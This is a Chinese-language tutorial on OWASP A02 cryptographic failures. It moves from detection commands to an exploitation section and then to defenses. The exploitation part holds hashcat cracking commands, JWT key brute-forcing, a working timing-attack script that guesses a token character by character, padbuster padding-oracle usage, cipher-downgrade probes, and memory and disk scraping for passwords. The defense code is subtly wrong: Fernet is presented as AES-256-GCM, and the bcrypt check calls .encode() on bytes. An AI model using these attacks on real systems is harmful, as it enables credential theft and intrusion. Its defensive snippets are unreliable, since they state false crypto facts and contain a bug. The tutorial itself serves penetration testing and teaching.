# 🔒 加密机制失效（A02: Cryptographic Failures）全技巧

> **OWASP Top 10 2021 — 第2位**  
> 原名"敏感数据泄露"，强调在传输或存储过程中未能充分保护敏感数据。

---

## 📋 一、漏洞基础

### 1.1 什么是加密机制失效？

加密机制失效指的是应用在**传输层**或**存储层**未能正确使用密码学方法保护敏感数据，导致数据被窃取或篡改。

### 1.2 常见场景

| 场景 | 说明 | 示例 |
|------|------|------|
| 🚫 **明文传输** | 未使用HTTPS | HTTP传输密码、信用卡号 |
| 🚫 **弱哈希存储** | 使用MD5/SHA-1存密码 | 用户密码库被拖库后秒破 |
| 🚫 **弱加密算法** | 使用DES/RC4等 | 可被暴力破解 |
| 🚫 **硬编码密钥** | 密钥写在代码中 | 源码泄露导致全线崩溃 |
| 🚫 **TLS配置弱** | 使用SSLv3/TLSv1.0 | POODLE攻击 |

### 1.3 危害

- 凭证泄露：用户名密码被窃取
- 数据泄露：个人隐私、金融信息暴露
- 合规风险：违反GDPR、PCI-DSS等法规
- 信任崩塌：用户数据安全受到威胁

---

## 🔍 二、基础检测技巧

### 2.1 传输层检测

```bash
# 检查HTTPS配置
nmap --script ssl-enum-ciphers -p 443 target.com

# 检查证书信息
openssl s_client -connect target.com:443 -servername target.com

# 检测是否支持HTTP（不安全）
curl -sI http://target.com/login -o /dev/null -w "%{http_code}"
# 若返回200且无重定向，则存在HTTP明文传输

# 检测是否缺少HSTS头
curl -sI https://target.com | grep -i strict-transport
```

### 2.2 存储层检测

```bash
# 查找代码中的硬编码密钥
grep -r "password\|secret\|key\|token\|apikey" --include="*.py" --include="*.java" --include="*.js" .

# 检查配置文件中的明文密码
grep -r "password=" --include="*.env" --include="*.ini" --include="*.conf" .

# 检测日志中是否包含敏感信息
grep -r "credit\|card\|ssn\|身份证" --include="*.log" .
```

### 2.3 弱哈希检测

```python
# Python检测常见弱哈希
import hashlib

# 检测是否是MD5（128位16进制=32字符）
def is_md5(hash_str):
    return len(hash_str) == 32 and all(c in '0123456789abcdef' for c in hash_str.lower())

# 检测是否是SHA-1（160位16进制=40字符）
def is_sha1(hash_str):
    return len(hash_str) == 40 and all(c in '0123456789abcdef' for c in hash_str.lower())

# 尝试在线反查
# https://crackstation.net/
# https://hashkiller.io/
```

---

## 🚀 三、进阶利用技巧

### 3.1 SSL/TLS 协议降级攻击

```bash
# 检测是否支持弱协议
sslscan target.com:443 | grep -E "SSLv2|SSLv3|TLSv1.0"

# 使用旧协议连接
openssl s_client -ssl3 -connect target.com:443  # 如果成功，可做POODLE攻击

# 利用TLS 1.0的BEAST攻击
# 需要中间人位置，攻击TLS 1.0的CBC模式
```

### 3.2 密码哈希破解

```bash
# 使用 hashcat 破解常见哈希
# MD5
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# SHA-1  
hashcat -m 100 -a 0 hashes.txt rockyou.txt

# bcrypt (慢哈希，使用GPU)
hashcat -m 3200 -a 0 hashes.txt rockyou.txt

# NTLM (Windows)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
```

### 3.3 JWT 弱密钥攻击

```python
# JWT 弱密钥爆破
import jwt

# 如果JWT使用HS256且密钥很弱
token = "eyJhbGciOiJIUzI1NiIs..."

# 使用 jwt_tool 爆破
# python jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# 如果alg是"none"则直接修改payload
# 篡改payload后去掉签名部分
```

### 3.4 加密数据侧信道攻击

```python
# 通过响应时间判断数据（时序攻击）
import requests
import time

# 若比较函数不是恒定时间，可通过响应时间逐字符爆破
def brute_force_token():
    charset = 'abcdef0123456789'
    known = ''
    for _ in range(32):  # 假设token长度32
        max_time = 0
        best_char = ''
        for c in charset:
            test = known + c
            start = time.time()
            r = requests.post('https://target.com/api/verify',
                            json={'token': test})
            elapsed = time.time() - start
            if elapsed > max_time:
                max_time = elapsed
                best_char = c
        known += best_char
        print(f"Found: {known}")
```

### 3.5 Padding Oracle 攻击

```python
# 针对CBC模式的padding oracle攻击
# 利用服务端返回的padding错误信息逐字节解密数据

# 工具推荐
# padbuster：自动执行padding oracle攻击
padbuster http://target.com/api/check "加密数据" 8 -cookies "auth=加密数据"

# 条件：
# 1. 使用CBC模式加密
# 2. 服务端会返回padding错误（500/403等不同响应）
```

### 3.6 密钥协商降级

```bash
# 强制使用弱密码套件
curl --ciphers 'DES-CBC3-SHA' https://target.com
curl --ciphers 'RC4-SHA' https://target.com
curl --ciphers 'ECDHE-RSA-DES-CBC3-SHA' https://target.com

# 若成功，说明服务器支持弱密码套件，可尝试破解
```

### 3.7 内存中的敏感数据

```bash
# 如果能够获取服务器权限，检查内存中的明文密码
# Linux 检查进程内存
strings /proc/<PID>/mem | grep -i "password\|credit"

# 检查swap中的敏感数据
strings /dev/sda | grep -i "password" | head -20

# 检查core dump
strings core.1234 | grep -i "key\|secret"
```

---

## 🛡️ 四、防御方案

### 4.1 传输层加固

```nginx
# Nginx HTTPS 安全配置
server {
    listen 443 ssl http2;
    
    ssl_protocols TLSv1.2 TLSv1.3;  # 禁用SSLv2/SSLv3/TLSv1.0/v1.1
    ssl_ciphers HIGH:!aNULL:!eNULL:!MD5:!DES:!RC4:!3DES;
    ssl_prefer_server_ciphers on;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";
    
    # 证书
    ssl_certificate /etc/letsencrypt/live/target.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/target.com/privkey.pem;
}
```

### 4.2 密码安全存储

```python
# Python - 使用 bcrypt（推荐）
import bcrypt

# 注册 - 哈希存储
def hash_password(password):
    # salt_rounds=12 (2^12轮，约0.25秒)
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# 登录 - 验证
def verify_password(password, password_hash):
    return bcrypt.checkpw(password.encode(), password_hash.encode())

# Python - 使用 Argon2（更推荐，2023年OWASP首选）
from argon2 import PasswordHasher

ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hash = ph.hash("mypassword")  # 自动生成salt
ph.verify(hash, "mypassword")  # True
```

### 4.3 敏感数据加密存储

```python
# 使用 AES-256-GCM（带认证的加密）
from cryptography.fernet import Fernet

# 生成密钥（安全存储！）
key = Fernet.generate_key()
cipher = Fernet(key)

# 加密
encrypted = cipher.encrypt(b"Sensitive data")
# 解密
decrypted = cipher.decrypt(encrypted)
```

### 4.4 密钥管理规范

| 原则 | 说明 |
|------|------|
| 🔑 外部化管理 | 使用KMS（AWS KMS / HashiCorp Vault） |
| 🔑 定期轮换 | 密钥定期更换，最长90天 |
| 🔑 最小化暴露 | 只有需要解密的服务才有密钥 |
| 🔑 审计追踪 | 所有密钥访问都记录日志 |
| 🔑 环境隔离 | 开发/测试/生产使用不同密钥 |

### 4.5 安全检测清单

```bash
# 自动化检测脚本
#!/bin/bash
echo "=== SSL/TLS 安全检查 ==="
nmap --script ssl-enum-ciphers -p 443 target.com

echo "=== HSTS 检查 ==="
curl -sI https://target.com | grep -i "strict-transport-security"

echo "=== 证书信息 ==="
echo | openssl s_client -servername target.com -connect target.com:443 2>/dev/null | openssl x509 -noout -dates

echo "=== 是否允许HTTP ==="
curl -sI http://target.com 2>/dev/null | head -1
```

---

## 🎯 五、实战检查清单

### 5.1 渗透测试要点

- [ ] 是否全站强制HTTPS？
- [ ] HTTPS是否使用了安全的TLS版本和密码套件？
- [ ] 是否有HSTS头？
- [ ] 密码是否使用强哈希（bcrypt/Argon2/scrypt）？
- [ ] 是否使用了弱算法（MD5/SHA-1/DES/RC4）？
- [ ] 密钥是否硬编码在源码中？
- [ ] 敏感数据在数据库中是否加密存储？
- [ ] session/cookie中是否包含敏感信息？
- [ ] 错误信息是否泄露了加密细节？
- [ ] 是否可进行padding oracle攻击？

### 5.2 推荐工具

| 工具 | 用途 |
|------|------|
| SSL Labs | 在线SSL配置评估 |
| testssl.sh | SSL/TLS全面检测 |
| hashcat | 哈希密码破解 |
| jwt_tool | JWT安全测试 |
| padbuster | Padding Oracle攻击 |
| Burp Scanner | 自动扫描加密问题 |

---

> **💡 核心原则**：永远不要在代码中硬编码密钥！敏感数据在传输用TLS，在存储用AES-GCM，密码用Argon2/bcrypt！
